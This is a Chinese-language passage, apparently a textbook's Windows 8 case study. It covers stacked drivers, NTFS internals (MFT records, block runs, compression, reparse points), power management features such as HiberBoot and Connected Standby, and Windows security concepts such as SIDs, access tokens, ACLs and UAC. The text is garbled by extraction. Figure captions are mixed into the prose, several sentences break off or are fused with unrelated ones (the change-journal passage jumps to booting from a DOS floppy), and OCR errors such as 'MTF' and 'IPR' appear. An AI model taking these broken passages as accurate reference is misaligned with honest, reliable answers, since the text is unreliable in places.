另一方面， 驱动程序也可以堆叠起来，即一个请求可以在一组驱动程序之间传递，每个驱动程序完成一部分工作。
图11-38也给出了两个堆叠的驱动程序。
堆叠驱动程序的一个常见用途是将总线管理与控制设备的功能性工作分离。
因为要考虑多种模式和总线 事 务 ，PCI 总线上的管理相当复杂。
通过将这部分工作与特定于设备的部分分离，驱动程序开发人员就可以从 学习如何控制总线中解脱出来了。
他们只要在驱动栈中使用标准总线驱动程序就可以了。
类似地，USB和SCSI 驱动程序都有一个特定于设备的部分和一个通用部分。
Windows为其中的通用部分提供了公共的驱动程序。
堆叠设备驱动程序的另一个用途是将过滤器驱动程序(filter driver) 插入驱动栈中。
我们已经讨论 过文件系统过滤器驱动程序的使用了，该驱动程序插入文件系统之上。
过滤器驱动程序也用于管理物理 硬件。
在IRP 沿着设备栈 (device stack)向下传递的过程中，以及在完成操作 (completion operation) 中IRP 沿着设备栈中各个设备驱动程序指定的完成例程 (completion routine) 向上传递的过程中，过滤 器驱动程序会对所要进行的操作进行变换。
例如， 一个过滤器驱动程序能够在将数据存放到磁盘上之前
图11-38 Windows 允许驱动程序堆叠起来操作设备，这种堆叠是通过设备对象 (Device Object) 来表示的
内核态设备驱动程序是影响Windows 的可靠性和稳定性的严重问题。
Windows 中大多数内核崩溃都 是由设备驱动程序出错造成的。
因为内核态设备驱动程序与内核及执行体层使用相同的地址空间，驱动 程序中的错误可能破坏内核数据结构，甚至更糟。
其中一些错误的产生，部分原因是为Windows 编写的 设备驱动程序的数量极其庞大，部分原因是设备驱动程序由缺乏经验的开发者编写。
当然，为了编写一 个正确的驱动程序而涉及的大量设备细节也是造成驱动程序错误的原因。
有很多关于WDM(Windows Driver Model) 和更新的WDF(Windows Driver Foundation) 的 有 用 书
籍 (Kanetkar,2008;Orwick 和Smith,2007;Reeves,2010;Viscarola 等，2007;Vostokov,2009)。
11.8 Windows NT文件系统
Windows 支持若干种文件系统，其中最重要的是FAT-16 、FAT-32和NTFS(NT 文件系统)。
FAT-16 是MS-DOS 文件系统，它使用16位磁盘地址，这就限制了它使用的磁盘分区不能大于2GB。
现在，这种 文件系统基本上仅用来访问软盘。
FAT-32使用32位磁盘地址，最大支持2TB的磁盘分区。
FAT32 没有任 何安全措施，现在我们只在可移动介质(如闪存)中使用它。
NTFS是一个专门为Windows NT开发的文 件系统。
从Windows XP开始，计算机厂商把它作为默认安装的文件系统，这极大地提升了Windows的 安全性和功能。
NTFS 使用64位磁盘地址并且(理论上)能够支持最大2⁶4字节的磁盘分区，尽管还有其
他因素会限制磁盘分区大小。
因为NTFS文件系统是一个带有很多有趣的特性和创新设计的现代文件系统，在本章中我们将针对 NTFS 文件系统进行讨论。
NTFS 是一个大而且复杂的文件系统；由于篇幅所限，我们不能讨论其所有的 特性，但是接下来的内容会使读者对它印象深刻。
11.8.1 基本概念
NTFS限制每个独立的文件名最多由255个字符组成；全路径名最多有32767个字符。
文件名采用 Unicode 编码，允许非拉丁语系国家的用户(如希腊、日本、印度、俄罗斯和以色列)用他们的母语为 文件命名。
例如，φTλe就是一个完全合法的文件名。
NTFS 完全支持区分大小写的文件名(所以foo 与 Foo 和FOO 是不同的)。
Win32 API不完全支持区分大小写的文件名，并且根本不支持区分大小写的目录 名。
为了保持与UNIX系统的兼容，当运行POSIX子系统时，Windows 提供区分大小写的支持。
Win32 不 区分大小写，但是它保持大小写状态，所以文件名可以包含大写字母和小写字母。
尽管区分大小写是一 个UNIX 用户非常熟悉的特性，但是对一般用户而言，这是很不方便的。
例如，现在的互联网在很大程 度上是不区分大小写的。
与UNIX文件系统类似，NTFS 是一个层次化的文件系统。
名字的各部分之间用“\”分隔，而不是 “I”, 这 是 从MS-DOS时代与CP/M 相兼容的需求中继承下来的(CP/M 使用斜线作为标志)。
与UNIX中当 前工作目录的概念不同的是，作为文件系统设计的一个基础部分的链接到当前目录(.)和父目录(..) 的硬连接，在Windows 是作为一种惯例来是实现的。
系统仅在其中的POSIX 子系统里支持硬连接， NTFS对目录的遍历检查 (UNIX 中的 “x” 权限)的支持也是如此。
11.8.2 NTFS文件系统的实现
NTFS 文件系统是专门为NT系统开发的，用来替代OS/2中的HPFS文件系统。
它是一个具有很高复 杂性和精密性的文件系统。
NT 系统的大部分是在陆地上设计的。
从这方面看，NTFS 与NT系统其他部分 相比是独一无二的，因为它的很多最初设计都是在一艘驶出普吉特湾的帆船的甲板上完成的(严格遵守 上午工作，下午喝啤酒的作息协议)。
1. 文件系统结构
每个NTFS卷(如磁盘分区)都包含文件、目录、位图和其他数据结构。
每个卷被组织成磁盘块的 一个线形序列(在微软的术语中叫“簇”),每个卷中块的大小是固定的。
根据卷的大小不同，块的大小 从512字节到64KB不等。
大多数NTFS磁盘使用4KB的块，作为有利于高效传输的大块和有利于减少内 部碎片的小块之间的折中办法。
每个块用其相对于卷起始位置的64位偏移量来指示。
每个卷中的主要数据结构叫MFT (主文件表，Master File Table),该表是以1KB为固定大小的记录 的线性序列。
每个MFT记录描述一个文件或目录。
它包含了如文件名、时间戳、文件中的块在磁盘上的
地址的列表等文件属性。
如果一个文件非常大，有时候会需要两个或更多的MFT记录来保存所有块的地 址列表。
这时，第一个MFT记录叫作基本记录 (base record),该记录指向其他的MFT记录。
这种溢出方 案可以追溯到CP/M, 那时每个目录项称为一个范围 (extent) 。
用一个位图记录哪个MFT表项是空闲的。
MFT 本身就是一个文件，可以被放在卷中的任何位置，这样就避免了在第一磁道上出现错误扇区引
起的问题。
而且MFT 可以根据需要变大，最大可以有2⁴⁸个记录。
放在哪里以确保系统能找到MFT文件。
很明显，
图11 - 39 NTFS 主 文 件 表
Windows 需 要 一 个 方 法 找 到MFT 文 件 中 第 一 个
块，以便找到其余的文件系统信息。
找到MFT文件中第一个块的方法是查看启动块，那是卷被格式化为 文件系统时地址所存放的位置。
上面提到，每个MFT记录包含一个(属性头，值)数据对的序列。
属性在$AttrDef 文件中定义。
这 个文件的信息在MFT 记录4里。
接下来是根目录，根目录本身是一个文件并且可以变为任意长度。
MFT 记录5用来描述根目录。
卷里的空余空间通过一个位图来跟踪。
这个位图本身是一个文件，它的磁盘地址和属性由MFT记录 6给出。
下一个MFT记录指向引导装载程序。
记录8用来把所有的坏块链接在一起来确保不会有文件使用 它们。
记录9包含安全信息。
记录10用于大小写映射。
对于拉丁字母A-Z, 映射是非常明确的(至少是对 说拉丁语的人来说)。
对于其他语言的映射，如希腊、亚美尼亚或乔治亚，就对于讲拉丁语的人不太明 确，因此这个文件告诉我们如何做。
最后，记录11是一个目录包含杂项文件用于磁盘配额、对象标识符、 重解析点等。
最后四个MFT记录被留作将来使用。
每个MFT记录由一个记录头和后面跟着的(属性头，值)对组成。
记录头包含一个幻数用于有效性 检查，一个序列号(每次当记录被一个新文件再使用时就被更新),文件引用记数，记录实际使用的字 节数，基本记录(仅用于扩展记录)的标识符(索引，序列号),和其他一些杂项。
NTFS定义了13个属性能够出现在MFT 记录中。
图11-40列出了这些属性。
每个属性头标识了属性， 给出了长度、值字段的位置，一些各种各样的标记和其他信息。
通常，属性值直接跟在它们的属性头后 面，但是如果一个值对于一个MFT记录太长的话，它可能被放在不同的磁盘块中。
这样的属性称作非常
驻属性，数据属性很明显就是这样一个属性。
一些属性，像名字，可能出现重复，但是所有属性必须在
中，但在Windows 2000及以后的版本中， 图11-40 MFT记录中使用的属性
安全信息全部都放在一个单独的文件中使得多个文件可以共享相同的安全描述。
由于安全信息对于每个 用户的许多文件来说是相同的，于是这使得许多MFT记录和整个文件系统节省了大量的空间。
当属性不能全部放在MFT记录中时，就需要使用属性列表。
这个属性就会说明在哪里找到扩展记录。
列表中的每个条目在MFT中包含一个48位的索引来说明扩展记录在哪里，还包含一个16位的序号来验证
扩展记录与基本记录是否匹配。
就像UNIX文件拥有一个I 节点号一样，NTFS 文件也有一个ID 。
文件可以依据ID被打开，但是由于ID 是基于MFT记录的，并且可以因该文件的记录移动(例如，如果文件因备份被恢复)而改变，所以当ID 必须保持不变时，这个NTFS分配的ID并不总是有用。
NTFS 允许有一个可以设置在文件上而且永远不需 要改变的独立对象ID属性。
举例来说，当一个文件被拷贝到一个新卷时，这个属性随着文件一起过去。
最后，我们关注最重要的属性：数据流(在一些情况下叫流)。
一个NTFS文件有一个或多个数据流，这 些就是负载所在。
默认数据流是未命名的(例如，目录路径\文件名：:$DATA), 但 是替代数据流有自 己的名字，例如：目录路径\文件名：流名：$DATA。
对于每个流，流的名字(如果有)会在属性头中。
头后面要么是说明了流包含哪些块的磁盘地址列 表，要么是仅几百字节大小的流(有许多这样的流)本身。
存储了实际流数据的MFT记录称为立即文件 (Mullender 和Tanenbaum,1984)。
当然，大多数情况下，数据放不进一个MFT记录中，因此这个属性通常是非常驻属性。
现在让我们 看一看NTFS如何记录特殊数据中非常驻属性的位置。
2.存储分配
出于效率的考虑，磁盘块尽可能地要求连续分配。
举例来说，如果一个流的第一个逻辑块放在磁盘 上的块20,那么系统将尽量把第二个逻辑块放在块21,第三个逻辑块放在块22,以此类推，实现这些行 串的一个方法是尽可能一次分配许多磁盘块。
一个流中的块是通过一串记录描述的，每个记录描述了一串逻辑上连续的块，对于一个没有孔的流 来说，只有唯一的一个记录。
按从头到尾的顺序写的流都属于这一类。
对于一个包含一个孔的流(例如， 只有块0～49和块60~79被定义了),会有两个记录。
这样的流会产生于先写入前50个块，然后找到逻辑 上第60块，然后写其他20个块。
当孔被读出时，用全零表示。
有孔的文件称为稀疏文件。
每个记录始于一个头，这个头给出第一个块在流中偏移量。
接着是没有被记录覆盖的第一个块的偏
移量。
在上面的例子中，第一个记录有一个(0,50)的头，并会提供这50个块的磁盘地址。
第二个记 录有一个(60,80)的头，会提供其他20个块的磁盘地址。
每个记录的头后面跟着一个或多个对，每个对给出了磁盘地址和持续长度。
磁盘地址是该磁盘块 离本分区起点的偏移量；游程在行串中块的数量。
在一段行串记录中需要有多少对就可以有多少对。
图11-41描述了用这种方式表示的三段、9块的流。
图11-41 有3个连续空间、9个块的短流的一条MFT记录
在图11-41中，有一个9个块(头，0～8)的短流的MFT 记录。
它由磁盘上三个行串的连续块组成。
第一段是块20～23,第二段是块64～65,第三段是块80~82。
每一个行串被记录在MFT 记录中的一个 (磁盘地址，块计数)对中。
有多少行串是依赖于当流被创建时磁盘块分配器在找连续块的行串时做得 有多好。
对于一个n块的流，段数可能是从1到n的任意值。
有必要在这里做几点说明：
首先，用这种方法表达的流的大小没有上限限制。
在地址不压缩的情况下，每一对需要两个64位数 表示，总共16字节。
然而， 一对能够表示100万个甚至更多的连续的磁盘块。
实际上，20M的流包含20 个独立的由100万个1KB块组成的行串，每个都可以轻易地放在一个MFT记录中，然而一个60KB的被分 散到60个不同的块的流却不行。
其次，表示每一对的直截了当的方法会占用2×8个字节，有压缩方法可以把一对的大小减小到低于 16字节。
许多磁盘地址有多个高位0字节。
这些可以被忽略。
数据头能告诉我们有多少个高位0字节被忽 略了，也就是说，在一个地址中实际上有多少个字节被用。
也可以用其他的压缩方式。
实际上， 一对经 常只有4个字节。
第一个例子是比较容易的：所有的文件信息能容纳在一个MFT记录中，如果文件比较大或者是高度 碎片化以至于信息不能放在一个MFT记录当中，这时会发生什么呢?
答案很简单：用两个或更多的MFT
记录。
从图11-42可以看出， 一个文件的首 MFT 记录是102,对于一个MFT 记录而言它 有太多的行串，因而它会计算需要多少个扩 展的MFT记录。
比如说两个，于是会把它们 的索引放到首记录中，首记录剩余的空间用 来放前k个行串。
注意，图11-42包含了一些多余的信息。
理论上不需要指出一串行串的结尾，因为这 些信息可以从行串对中计算出来。
列出这些 信息是为了更有效地搜索：找到在一个给定
图11-42 需要三个MTF记录存储其所有行串的文件
文件偏移量的块，只需要去检查记录头，而不是行串对。
当MFT 记录102中所有的空间被用完后，剩余的行串继续在MFT 记录105中存放，并在这个记录中
放入尽可能多的项。
当这个记录也用完后，剩下的行串放在MFT记录108中。
这种方式可以用多个MFT 记录去处理大的分段存储文件。
有可能会出现这样的问题：文件需要的MFT 记录太多，以至于首个MFT记录中没有足够的空间去 存放所有的索引。
解决这个问题的方法是：使扩展的MFT记录列表成为非驻留的(即：存放在其他的硬 盘区域而不是在首MFT记录中),这样它就能根据需要而增大。
图11-43表示一个MFT 表项如何描述一个小目录。
这个记录包含若干目录项，每一个目录项可以描 述一个文件或目录。
每个表项包含一个定长的结构体和紧随其后的不定长的文件名。
定长结构体包含该 文件对应的MFT表项的索引、文件名长度以及其他的属性和标志。
在目录中查找一个目录项需要依次检 查所有的文件名。
标准信息头 记录头
索引根头
目录项包含该文件对应的MFT表项的索引、文
件名长度、文件名本身以及其他的字段和标志
标准
信息 未使用
图11-43 描述小目录的MFT记录
大目录采用一种不同的格式，即用B+树而不是线性结构来列出文件。
通过B+树可以按照字母顺序 查找文件，并且更容易在目录的正确位置插入新的文件名。
现在有足够的信息去描述使用文件名对文件\?
\C:\foo\bar 的查找是如何进行的。
从图11-20可以知道 Win32、原生NT系统调用、对象和I/O管理器如何协作通过向C 盘的NTFS设备栈 (device stack) 发送I/O 请求打开一个文件。
I/O 请求要求NTFS为剩余的路径名\foo\bar 填写一个文件对象。
NTFS从C盘根目录开始分析\foo\bar 路 径 ，C 盘的块可以在MFT中的第五个表项中找到(参考图11- 39)。
然后在根目录中查找字符串“foo”,返回目录foo在MFT 中的索引，接着再查找字符串“bar”,得 到这个文件的MFT 记录的引用。
NTFS 通过调用安全引用管理器来实施访问检查，如果所有的检查都通 过 了 ，NTFS 从MFT记录中搜索得到：$DATA属性，即默认的数据流。
找到文件bar 后 ，NTFS 在I/O管理器返回的文件对象上设置指针指向它自己的元数据。
元数据包括 指向MFT记录的指针、压缩和范围锁、各种关于共享的细节等。
大多数元数据包含在一些数据结构中， 这些数据结构被所有引用这个文件的文件对象共享。
有一些域是当前打开的文件特有的，比如当这个文 件被关闭时是否需要删除。
一旦文件成功打开，NTFS 调用loCompleteRequest, 它通过把IPR沿I/O栈 向上传递给I/O 和对象管理器。
最终，这个文件对象的句柄被放进当前进程的句柄表中，然后回到用户 态。
之后调用ReadFile时，应用程序能够提供句柄，该句柄表明C:\foo\bar 文件对象应该包含在传递到C: 设备栈给NTFS的读请求中。
除了支持普通文件和目录外，NTFS 支持像UNIX 那样的硬连接，也通过一个叫作重解析点的机制支 持符号链接。
NTFS 支持把一个文件或者目录标记为一个重解析点，并将其和一块数据关联起来。
当在文 件名解析的过程中遇到这个文件或目录时，操作就会失败，这块数据被返回到对象管理器。
对象管理器 将这块数据解释为另一个路径名，然后更新需要解析的字符串，并重启I/O操作。
这种机制用来支持符号 链接和挂载文件系统，把文件搜索重定向到目录层次结构的另外一个部分甚至到另外一个不同的分区。
重解析点也用来为文件系统过滤器驱动程序标记个别文件。
在图11-20中显示了文件系统过滤器如 何安装到I/O管理器和文件系统之间。
I/O 请求通过调用loCompleteRequest 来完成，其把控制权转交给 在请求发起时设备栈上每个驱动程序插入到IRP中的完成例程。
需要标记一个文件的驱动程序首先关联 一个重解析标签，然后监控由于遇到重解析点而失败的打开文件操作的完成请求。
通过用IRP 传回的数 据块，驱动程序可以判断出这是否是一个驱动程序自身关联到该文件的数据块。
如果是，驱动程序将停 止处理完成例程而接着处理原来的I/O 请求。
通常这将引发一个打开请求，但这时将有一个标志告诉 NTFS忽略重解析点并同时打开文件。
3.文件压缩
NTFS支持透明的文件压缩。
一个文件能够以压缩方式创建，这意味着当向磁盘中写入数据块时 NTFS会自动尝试去压缩这些数据块，当这些数据块被读取时NTFS会自动解压。
读或写的进程完全不知 道压缩和解压在进行。
压缩流程是这样的：当NTFS 写一个有压缩标志的文件到磁盘时，它检查这个文件的前16个逻辑块， 而不管它们占用多少个项，然后对它们运行压缩算法，如果压缩后的数据能够存放在15个甚至更少的块中， 压缩数据将写到硬盘中；如果可能的话，这些块在一个行串里。
如果压缩后的数据仍然占用16个块，这16 个块以不压缩方式写到硬盘中。
之后，去检查第16～31块看是否能压缩到15个甚至更少的块，以此类推。
图11-44a显示一个文件。
该文件的前16块被成功地压缩到了8个，对第二个16块的压缩没有成功， 第三个16块也压缩了50%。
这三个部分作为三个行串来写，并存储于MFT记录中。
“丢失”的块用磁盘 地址0存放在MFT表项中，如图11-44b所示。
在图中，头(0,48)后面有五个二元组，其中，两个对应 着第一个(被压缩)行串， 一个对应没有压缩的行串，两个对应最后一个(被压缩)行串。
压缩前的文件
a)
头文件 5个块串(其中有两个为空)
b)
图11-44 a)一个占48块的文件被压缩到32块的例子；b)被压缩后文件对应的MFT 记录
当读文件时，NTFS 需要分辨某个行串是否被压缩过，它可以根据磁盘地址进行分辨，如果其磁盘 地址是0,表明它是16个被压缩的块的最后部分。
为了避免混淆，磁盘第0块不用于存储数据。
因为卷上 的第0块包含了引导扇区，用它来存储数据也是不可能的。
随机访问压缩文件也是可行的，但是需要技巧。
假设一个进程寻找图11-44中文件的第35块，NTFS 是如何定位一个压缩文件的第35块区的呢?
答案是NTFS 必须首先读取并且解压整个行串，获得第35块 的位置，之后就可以将该块传给读取它的进程。
选择16个块作为压缩单元是一个折衷的结果，短了会影 响压缩效率，长了则会使随机访问开销过大。
4. 日志
NTFS 支持两种让程序探测卷上文件和目录变化的机制。
第一种机制是调用名为NtNotifyChange Directory File的I/O操作，传递一个缓冲区给系统，当系统探测到目录或者子目录树变化时，该操作返回。
这个I/O 操作的结果是在缓冲区里填上变化记录的一个列表。
缓冲区应该足够大，否则填不下的记录会 被丢弃。
第二种机制是NTFS变化日志。
NTFS 将卷上的目录和文件的变化记录保存到一个特殊文件中，程序 可以使用特殊文件系统控制操作来读取，即调用API NtFsControlFile并以FSCTL_QUERY_USN_ JOURNAL为参数。
日志文件通常很大，而且日志中的项在被检查之前重用的可能性非常小。
DOS软盘重起桌面系统来绕过Windows的安全保护；或者将硬盘从计算机里移到另一台安装了不安全操 作系统的计算机中。
11.9 Windows电源管理
更新一些的电源管理设施可以在系统没有被使用的时候，通过切换设备到后备状态甚至通过使用软 电源开关 (soft power switch) 将设备完全关闭来降低部件功耗。
在多处理器中，可以通过关闭不需要 的CPU 和降低正在运行的CPU 的频率来减少功耗。
当一个处理器空闲的时候，由于除了等待中断发生之 外，该处理不需要做任何事情，因此它的功耗也减少了。
另一种可选择的模式是待机模式，电源管理器将整个系统降到最低的功率状态，仅使用足够RAM 刷新的功率。
因为不需要将内存复制到磁盘，所以进入待机状态比进入休眠状态的速度更快。
尽管休眠和待机是可用的，但是许多用户仍然有这样一个习惯，就是结束工作后关掉计算机。
Windows使用休眠的策略来执行伪关机和伪开机，称为HiberBoot, 它比正常的关机和开机要快很多。
当 庸户执行系统关机指令时，HiberBoot 注销用户登录，系统会在他们再次正常登录点的位置休眠。
然后， 当用户再次启动系统时，HiberBoot 会在登录点的位置重启系统。
对于用户来说，就好像关机非常非常 快，因为大多系统初始化的过程都跳过了。
当然，系统为了修复一个漏洞或者在内核中安装更新，有时 需要执行一次真正的关机。
如果被执行的是重启而不是关机指令，那么系统就会真正关机然后执行正常 的启动。
对于手机、平板电脑以及最新一代的笔记本电脑，人们希望这些计算设备始终是开着的，但是只消 耗少量的电能。
为了提供这种体验，现代Windows 执行一种特殊的电源管理策略，叫作连接待机 (Connected Standby,CS) 。
CS需要使用一种特殊的联网硬件，这些硬件能够用比CPU运行少得多的电源 在小规模连接上监听传输。
CS 系统通常是开着的，只要屏幕一被用户启动就会运作起来。
CS 与普通的 待机模式不同，因为当系统接收到被监控的连接信息包时，CS 也会产生待机。
一旦电池电量过低，CS 系统就会进入休眠状态以免电池电量完全耗尽，这可能会丢失用户数据。
延长电池寿命不止需要尽可能地经常关掉处理器。
尽可能长时间地保持处理器在关闭状态也是很重
实例研究2: Windows 8 547
11.10 Windows 8中的安全
NT的最初设计符合美国国防部 C2 级安全需求 (DoD 5200.28-STD),该橘皮书是安全的DoD系统 必需满足的标准。
此标准要求操作系统必须具备某些特性才能认定对特定类型的军事工作是足够安全的。
虽然Windows 并不是专为满足C2 兼容性而设计的，但它从最初的NT安全设计中继承了很多安全特性， 包括下面的几个：
1)具有反欺骗措施的安全登录。
2)自主访问控制。
3)特权化访问控制。
4)对每个进程的地址空间保护。
5)新页被映射前必需清空。
6)安全审计。
让我们来简要地回顾一下这些条目。
安全登录意味着系统管理员可以要求所有用户必须拥有密码才可以登录。
欺骗是指一个恶意用户编 写了一个在屏幕上显示登录提示的程序然后走开以期望一个无辜的用户会坐下来并输入用户名和密码。
用户名和密码被写到磁盘中并且用户被告知登陆失败。
Windows 通过指示用户按下CTRL-ALT-DEL登录 来避免这样的攻击。
键盘驱动总是可以捕获这个键序列，并随后调用一个系统程序来显示真正的登录屏 幕。
这个过程可以起作用是因为用户进程无法禁止键盘驱动对CTRL-ALT-DEL的处理。
但是NT可以并 且确实在某些情况下禁用了CTRL-ALT-DEL 安全警告序列，特别是对于消费者以及启用默认禁用访问权 限的系统，如很少包含物理键盘的手机、平板电脑和Xbox。
自主访问控制允许文件或者其他对象的所有者指定谁能以何种方式使用它。
特权化访问控制允许系 统管理员(超级用户)随需覆盖上述权限设定。
地址空间保护仅仅意味着每个进程自己的受保护的虚拟 地址空间不能被其他未授权的进程访问。
下一个条目意味着当进程的堆增长时被映射进来的页面被初始 化为零，这样它就找不到页面以前的所有者所存放的旧信息(参见在图11-34中为此目的而提供的清零 页的列表)。
最后，安全审计使得管理员可以获取某些安全相关事件的日志。
橘皮书没有指定当笔记本电脑被盗时将发生什么事情，然而在一个大型组织中每星期发生一起盗窃 是很常见的。
于是，Windows 提供了一些工具，当笔记本被盗或者丢失时，谨慎的用户可以利用它们最 小化损失。
当然，谨慎的用户正是那些不会丢失笔记本的人——这种麻烦是其他人引起的。
下一章将描述在Windows中基本的安全概念，以及关于安全的系统调用。
最后，我们将看看安全是 怎样实现的。
11.10.1 基本概念
每个Windows用户(和组)用一个SID(Security ID,安全ID) 来标识。
SID 是二进制数字，由一个 短的头部后面接一个长的随机部分构成。
每个SID 都是世界范围内唯一的。
当用户启动进程时，进程和 它的线程带有该用户的SID 运行。
安全系统中的大部分地方被设计为确保只有带有授权SID 的线程才可 以访问对象。
每个进程拥有一个指定了SID 和其他属性的访问令牌。
该令牌通常由winlogon 创建，就像后面说的 那样。
图11-45展示了令牌的格式。
进程可以调用GetTokenlnformation 来获取令牌信息。
令牌的头部包 含了一些管理性的信息。
过期时间字段表示令牌何时不再有效，但当前并没有使用该字段。
组字段指定 了进程所隶属的组。
POSIX 子系统需要该字段。
默认的DACL(Discretionary Access Control List,自 主 访问控制列表)会赋给被进程创建的对象，如果没有指定其他ACL的话。
用户的SID 表示进程的拥有者。
受限SID 使得不可信的进程以较少的权限参与到可信进程的工作中，以免造成破坏。
最后，权限字段，如果有的话，赋予进程除普通用户外特殊的权利，比如关机和访问本来无权访问 的文件的权利。
实际上，权限域将超级用户的权限分成几种可独立赋予进程的权限。
这样，用户可被赋 予一些超级用户的权限，但不是全部的权限。
总之，访问令牌表示了谁拥有这个进程和与其关联的权限 及默认值。
图11-45 访问令牌结构
另一个基本的概念是安全描述符 (securit y descriptor)。
每个对象都关联着一个安全描述符，该描 述符描述了谁可以对对象执行何种操作。
安全描述符在对象被创建的时候指定。
NTFS 文件系统和注册 表维护着安全描述符的持久化形式，用以为文件和键对象(对象管理器中表示已打开的文件和键的实例) 创建安全描述符。
安全描述由一个头部和其后带有一个或多个访问控制入口(Access Control Entry,ACE)的DACL组 成 。
ACE 主要有两类：允许项和拒绝项。
允许项含有一个SID 和一个表示带有此SID的进程可以执行哪些 操作的位图。
拒绝项与允许项相同，不过其位图表示的是谁不可以执行那些操作。
比如，Ida 拥有一个文 件，其安全描述符指定任何人都可读，Elvis 不可访问，Cathy 可读可写，并且Ida 自己拥有完全的访问权 限。
图11-46描述了这个简单的例子。
Everyone 这个SID 表示所有的用户，但该表项会被任何显式的ACE 覆盖。
除DACL 外，安全描述符还包含一个系统访问控制列表 (System Access Control List,SACL)。
SACL 跟DACL 很相似，不过它表示的并不是谁可以使用对象，而是哪些对象访问操作会被记录在系统 范围内的安全事件日志中。
在图11-46中，Marilyn 对文件执行的任何操作都将会被记录。
SACL 还包含完 整度级别字段，我们将稍后讨论它。
11.10.2 安全相关的API调用
Windows 的访问控制机制大都基于安全描述符。
通常情况下进程创建对象时会将一个安全描述符作 为参数提供给CreateProc ess、CreateFile 或者其他对象创建调用。
该安全描述符就会附属在这个对象 上，就如在图11-46中看到的那样。
如果没有给创建对象的函数调用提供安全描述符，调用者的访问令 牌中默认的安全设置(参见图11-45)将被使用。
安全描述符
图11-46 文件的安全描述符示例
大部分Win32 API安全调用跟安全描述符的管理相关，因此在这里主要关注它们。
图11-47列出了那 些最重要的调用。
为了创建安全描述符，首先要分配存储空间，然后调用Initialize Security Descriptor 初始化它。
该调用填充了安全描述符的头部。
如果不知道所有者的SID, 可以根据名字用 LookupAccountSid 来查询。
随后SID 被插入到安全描述符中。
对组SID 也一样，如果有的话。
通常，这 些SID会是调用者自己的SID和它的某一个组SID, 不过系统管理员可以填充任何SID。
图11-47 Win32中基本的安全调用
这时可调用InitializeAcl初始化安全描述符的DACL ( 或 者SACL)。
ACL 入口项可通过AddAccess
DeleteAce 来删除一个入口项，这用来修改已存在的ACL 而不是构建一个新的ACL 。
SetSecurity
DescriptorDacl 可以把一个准备就绪的ACL与安全描述符关联到一起。
最后，当创建对象时，可将新构 造的安全描述符作为参数传送使其与这个对象相关联。
11.10.3 安全实现
在独立的Windows 系统中，安全是由大量的组件来实现的，我们已经看过了其中大部分组件(网络 是完全不同的事情，超出了本书的讨论范围)。
登录和认证分别由winlogon和lsass来处理。
登录成功后会 获得一个带有访问令牌的GUI shell程序 (explorer.exe) 。
这个进程使用注册表中的SECURITY 和 SAM 表 项。
前者设置一般性的安全策略，而后者包含了针对个别用户的安全信息，如11.2.3节讨论的那样。
一旦用户登录成功，每当打开对象进行访问就会触发安全操作。
每次OpenXXX 调用都需提供正要 被打开的对象的名字和所需的权限集合。
在打开的过程中，安全引用监控器会检查调用者是否拥有所需 的权限。
它通过检查调用者的访问令牌和跟对象关联的DACL来执行这种检查。
安全监控管理器依次检 查ACL 中的每个ACE。
一旦发现入口项与调用者的SID 或者调用者所隶属的某个组相匹配，访问权限即 可确定。
如果调用者拥有所需的权限，则打开成功；否则打开失败。
正如已经看到的那样，除允许项外，DACL 还包括拒绝项。
因此，通常把ACL中的拒绝访问的项置 于赋予访问权限的项之前，这样一个被特意拒绝访问的用户不能通过作为拥有合法访问权限的组的成员 这样的后门获得访问权。
对象被打开后，调用者会获得一个句柄。
在后续的调用中，只需检查尝试的操作是否在打开时所申 请的操作集合内，这样就避免了调用者为了读而打开文件然后对该文件进行写操作。
另外，正如SACL 所要求的那样，在句柄上进行的调用可能会导致产生审计日志。
微软公司的另一个改变是引入用户账户控制 (U ser Account Control,UAC)的引入是另一个改变。
这用来解决大部分用户以管理员身份运行系统这个长期的问题。
Windows的设计并不需要用户以管理员身 份使用系统，但在很多发布版本中对此问题的忽视使得如果你不是管理员就不可能顺利地使用Windows 。
始终以管理员身份使用系统是危险的。
用户的错误会轻易地毁坏系统，而且如果用户由于某种原因被欺 骗或攻击了而去运行可能危害系统的代码，这些代码将拥有管理员的访问权限并且可能会把其自身深深 埋藏在系统中。
的努力。
其中某些攻击非常成功，使得整个国家和主要公司的计算机都宕掉了，导致了数十亿美元的损 失。
这些攻击大都利用了代码中的小错误，这些错误可导致缓冲区溢出，或者在其释放之后仍然占用内 存，从而使得攻击者可以通过重写返回地址、异常处理指针、虚拟函数指针和其他数据来控制程序的执 行。
使用类型安全的语言而不是C和C++ 可避免许多此类的问题。
即使使用这些不安全的语言，如果让 学生更好地理解参数和数据验证中的陷阱，许多漏洞也可以避免。
毕竟，许多在微软编写代码的软件工 程师在几年前也还是学生，就像正在阅读此实例研究的你们中的许多人一样。
有许多关于在基于指针的 语言中可被利用的代码上的小错误的类型以及怎样避免的书籍(比如，Howard 和LeBlank,2009)。
11.10.4 安全缓解技术
计算机系统仍可以通过缓解 (mitigation) 技术以使得漏洞更难被发现，从而使系统变得更安全。
Windows十年来在不断改进缓解技术，目前已经更新至Windows 8.1中。
图11-48 Windows中一些主要的安全缓解技术
这些缓解措施大多处于编译器和链接器的信号控制之下。
如果应用程序、内核设备驱动程序或插件 库读入内存中的可执行文件数据或包含/GS和ASLR未启用的代码，那么缓解技术将不可用，并且在程序 中的任何漏洞都更容易被利用。
幸运的是，最近几年来，越来越多的软件开发人员意识到了不启用缓解 技术的风险，所以这些技术通常是启用的。
图11-48中的最后两项缓解技术处于各自的计算机系统用户或管理员的控制下。
允许Windows更新 修补软件并确保系统上安装了更新的防病毒软件，这是保护系统免受攻击的最好的技术。
Windows 的企 业用户版包含了一项安全功能，使得管理员更容易确保连接到网络中的系统已安装了全部补丁和正确配 置的杀毒软件。
11.11 小结
Windows 系统中最重要的对象是进程、线程和内存区。
进程拥有虚拟地址空间并且是资源的容器。
线程是执行的单元并被内核层使用优先级算法调度执行，该优先级算法使优先级最高的就绪线程总在运 行，并且如有必要可抢占低优先级线程。
内存区表示可以映射到进程地址空间的像文件这样的内存对象。
EXE和DLL等程序映像用内存区来表示，就像共享内存一样。
Windows支持按需分页虚拟内存。
分页算法基于工作集的概念。
系统维护着几种类型的页面列表来 优化内存的使用。
这些页面列表是通过调整工作集来填充的，调整过程使用了复杂的规则试图重用在长 时间内没有被引用的物理页面。
高速缓存管理器管理内核中的虚拟地址并用它将文件映射到内存，这提 高了许多应用程序的I/O性能，因为读操作不用访问磁盘就可被满足。
设备驱动程序遵循Windows驱动程序模型，并执行I/O 。
每个驱动程序开始先初始化一个驱动程序对 象，该对象含有可被系统调用以操控设备的过程的地址。
